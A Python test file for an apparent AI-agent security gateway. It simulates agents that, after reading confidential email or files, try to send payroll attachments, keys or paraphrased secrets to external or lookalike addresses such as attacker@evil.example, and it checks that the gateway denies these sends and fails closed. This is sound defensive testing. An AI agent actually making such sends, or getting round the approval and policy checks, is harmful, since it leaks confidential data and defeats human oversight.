"""End-to-end gateway behaviour: attack scenarios, fail-closed paths, truthful reporting."""

from __future__ import annotations

from aegis.core.audit import AuditError, AuditLog
from aegis.core.gateway import Status
from aegis.core.schemas import RiskReport, Sensitivity
from tests.conftest import INTERNAL_USER, SAFE, call, make_grant, send, session


def test_benign_read_executes_and_returns_untrusted_marker(gateway):
    r = gateway.submit(call("read_email", email_id="e-001"), session(), risk=SAFE)
    assert r.status is Status.EXECUTED
    assert r.output["body"]["trust"] == "untrusted"


def test_detector_miss_gateway_holds_payroll_exfiltration(gateway, env):
    """The demo case: detector says 'safe', agent sends payroll externally, gateway denies."""
    s = session(make_grant(tools=("read_email", "read_file", "send_email")))
    assert gateway.submit(call("read_email", email_id="e-002"), s, risk=SAFE).executed
    r = gateway.submit(
        send(["audit@finance-review.example"], attachments=["f-002"]), s, risk=SAFE
    )
    assert r.status is Status.DENIED
    assert {"P007", "P008"} <= set(r.rule_ids)
    assert env.outbox == []


def test_paraphrased_exfiltration_after_confidential_read_is_denied(gateway, env):
    """No attachment and no copied text: the session label alone blocks egress."""
    ext = "onboarding@northwind-partners.example"
    s = session(make_grant(recipients=(ext,)))  # even with the recipient granted
    assert gateway.submit(call("read_file", file_id="f-005"), s, risk=SAFE).executed
    assert s.label is Sensitivity.CONFIDENTIAL
    r = gateway.submit(send([ext], body="Our two biggest accounts are C. and F."), s, risk=SAFE)
    assert r.status is Status.DENIED and "P008" in r.rule_ids
    assert env.outbox == []


def test_lookalike_domain_credential_theft_is_denied(gateway, env):
    s = session()
    assert gateway.submit(call("read_file", file_id="f-006"), s, risk=SAFE).executed
    r = gateway.submit(send(["it-helpdesk@aegis-c0rp.example"], body="keys"), s, risk=SAFE)
    assert r.status is Status.DENIED and {"P007", "P008"} <= set(r.rule_ids)


def test_multi_step_attack_reads_succeed_but_egress_is_denied(gateway, env):
    s = session()
    found = gateway.submit(call("search_files", query="contract"), s, risk=SAFE)
    assert found.executed and found.output["results"][0]["file_id"] == "f-008"
    assert gateway.submit(call("read_file", file_id="f-008"), s, risk=SAFE).executed
    draft = gateway.submit(
        {"tool": "draft_email", "args": {"to": ["legal-review@lexcounsel.example"],
                                         "subject": "summary", "body": "24 months, 85k"}},
        s, risk=SAFE,
    )
    assert draft.executed  # drafts never leave the sandbox
    r = gateway.submit(send(["legal-review@lexcounsel.example"], body="24 months, 85k"), s, risk=SAFE)
    assert r.status is Status.DENIED
    assert env.outbox == []


def test_search_is_scoped_to_grant(gateway):
    s = session(make_grant(files=("f-001", "f-003"), max_read=Sensitivity.INTERNAL))
    r = gateway.submit(call("search_files", query="payroll"), s, risk=SAFE)
    assert r.executed and r.output["results"] == []


def test_legitimate_send_completes_with_approval(gateway, env):
    s = session(make_grant(recipients=("raj.patel@aegis-corp.example",)))
    assert gateway.submit(call("read_file", file_id="f-007"), s, risk=SAFE).executed
    req = send(["raj.patel@aegis-corp.example"], body="Agenda attached", attachments=["f-007"])
    pending = gateway.submit(req, s, risk=SAFE)
    assert pending.status is Status.PENDING_APPROVAL and env.outbox == []
    token = gateway.approvals.approve(pending.approval_request_id)
    done = gateway.submit(req, s, risk=SAFE, approval_token=token)
    assert done.status is Status.EXECUTED
    assert [m.to for m in env.outbox] == [("raj.patel@aegis-corp.example",)]


def test_policy_engine_exception_fails_closed(env, policy, clock):
    from aegis.core.approvals import ApprovalService
    from aegis.core.gateway import Gateway
    from tests.conftest import TEST_SECRET

    def broken(*a, **k):
        raise RuntimeError("policy bug")

    gw = Gateway(env, policy, ApprovalService(TEST_SECRET, clock), AuditLog(), clock, evaluate_fn=broken)
    s = session(make_grant(recipients=(INTERNAL_USER,)))
    for raw in (call("read_email", email_id="e-001"), send([INTERNAL_USER])):
        r = gw.submit(raw, s, risk=SAFE)
        assert r.status is Status.DENIED and r.rule_ids == ("P000",)
    assert gw.trace == [] and env.outbox == []


def test_policy_returning_garbage_fails_closed(env, policy, clock):
    from aegis.core.approvals import ApprovalService
    from aegis.core.gateway import Gateway
    from tests.conftest import TEST_SECRET

    gw = Gateway(env, policy, ApprovalService(TEST_SECRET, clock), AuditLog(), clock,
                 evaluate_fn=lambda *a: "ALLOW")
    r = gw.submit(call("read_email", email_id="e-001"), session(), risk=SAFE)
    assert r.status is Status.DENIED and r.rule_ids == ("P000",)


class FailingAudit(AuditLog):
    def append(self, record):
        raise AuditError("disk full")


def test_audit_failure_prevents_execution(env, policy, clock):
    from aegis.core.approvals import ApprovalService
    from aegis.core.gateway import Gateway
    from tests.conftest import TEST_SECRET

    gw = Gateway(env, policy, ApprovalService(TEST_SECRET, clock), FailingAudit(), clock)
    r = gw.submit(call("read_email", email_id="e-001"), session(), risk=SAFE)
    assert r.status is Status.DENIED and "G001" in r.rule_ids
    assert gw.trace == []


def test_tool_failure_is_reported_as_failed_not_executed(gateway, env):
    class BrokenStore(list):
        def append(self, item):
            raise OSError("storage unavailable")

    env.drafts = BrokenStore()
    s = session()
    r = gateway.submit(
        {"tool": "draft_email", "args": {"to": [INTERNAL_USER], "subject": "s", "body": "b"}},
        s, risk=SAFE,
    )
    assert r.status is Status.FAILED and "G002" in r.rule_ids and not r.executed
    assert gateway.trace == [] and s.executed == ()
    assert r.for_agent()["status"] == "failed"


def test_agent_message_reports_blocked_action_truthfully(gateway):
    s = session()
    r = gateway.submit(send(["attacker@evil.example"], attachments=["f-002"]), s, risk=SAFE)
    msg = r.for_agent()
    assert msg["status"] == "denied" and "result" not in msg
    assert "P008" in msg["rule_ids"]


def test_high_risk_input_escalates_internal_send(gateway):
    s = session(make_grant(recipients=(INTERNAL_USER,)))
    r = gateway.submit(send([INTERNAL_USER]), s, risk=RiskReport(0.95, detector="test"))
    assert r.status is Status.PENDING_APPROVAL and "P011" in r.rule_ids


def test_gateway_works_with_no_detector(gateway, env):
    s = session(make_grant(recipients=(INTERNAL_USER,)))
    assert gateway.submit(call("read_email", email_id="e-001"), s, risk=None).executed
    r = gateway.submit(send([INTERNAL_USER]), s, risk=None)
    assert r.status is Status.PENDING_APPROVAL and "P012" in r.rule_ids
